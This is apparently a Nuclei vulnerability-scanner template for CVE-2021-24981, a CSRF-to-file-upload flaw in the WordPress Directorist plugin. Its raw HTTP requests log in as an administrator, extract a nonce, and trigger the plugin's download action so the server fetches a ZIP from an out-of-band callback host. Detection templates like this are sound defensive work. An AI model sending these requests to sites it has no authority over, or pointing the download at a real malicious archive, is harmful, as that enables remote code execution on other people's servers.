id: CVE-2021-24981

info:
  name: WordPress Directorist < 7.0.6.2 - CSRF to Remote File Upload
  author: KrE80r
  severity: high
  description: |
    The Directorist plugin for WordPress before 7.0.6.2 is vulnerable to Cross-Site Request Forgery (CSRF) leading to arbitrary file upload. The atbdp_download_file AJAX action allows authenticated administrators to download and extract ZIP files to wp-content/plugins by bypassing license validation via the skip_licencing parameter.
  impact: |
    Successful exploitation allows remote code execution by uploading a malicious PHP file to the plugins directory via CSRF.
  remediation: |
    Update to Directorist version 7.0.6.2 or later.
  reference:
    - https://wpscan.com/vulnerability/4c45df6d-b3f6-49e5-8b1f-edd32a12d71c
    - https://blog.sucuri.net/2021/11/fake-ransomware-infection-spooks-website-owners.html
    - https://nvd.nist.gov/vuln/detail/CVE-2021-24981
    - https://pastebin.com/QnyAYnqF
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 7.5
    cve-id: CVE-2021-24981
    cwe-id: CWE-352,CWE-434
    epss-score: 0.00414
    epss-percentile: 0.73934
    cpe: cpe:2.3:a:wpwax:directorist:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: wpwax
    product: directorist
    framework: wordpress
  tags: cve,cve2021,wpscan,wordpress,wp-plugin,wp,directorist,csrf,file-upload,wpwax,authenticated

http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Origin: {{RootURL}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: wordpress_test_cookie=WP%20Cookie%20check

        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

      - |
        GET /wp-admin/edit.php?post_type=at_biz_dir&page=atbdp-extension HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=atbdp_download_file&nonce={{nonce}}&type=plugin&download_item[download_link]=http://{{interactsh-url}}/{{rand_base(6)}}.zip&download_item[skip_licencing]=true&download_item[permalink]=true

    cookie-reuse: true

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
        condition: or

    extractors:
      - type: regex
        name: nonce
        part: body_2
        group: 1
        regex:
          - 'atbdp_admin_data\s*=\s*\{"nonce"\s*:\s*"([a-f0-9]{10})"'
        internal: true
